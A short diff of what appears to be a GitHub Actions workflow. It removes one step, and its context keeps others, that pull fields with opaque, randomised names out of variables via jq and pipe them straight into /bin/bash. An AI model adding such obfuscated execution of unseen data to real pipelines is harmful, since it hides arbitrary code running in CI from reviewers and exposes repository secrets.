@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$m2" | jq -r .et578 | /bin/bash
           printf '%s' "$z62325" | jq -r .lrnb15 | /bin/bash
           printf '%s' "$w264" | jq -r .tjwxb51 | /bin/bash
-          printf '%s' "$qoa1241" | jq -r .bi476 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
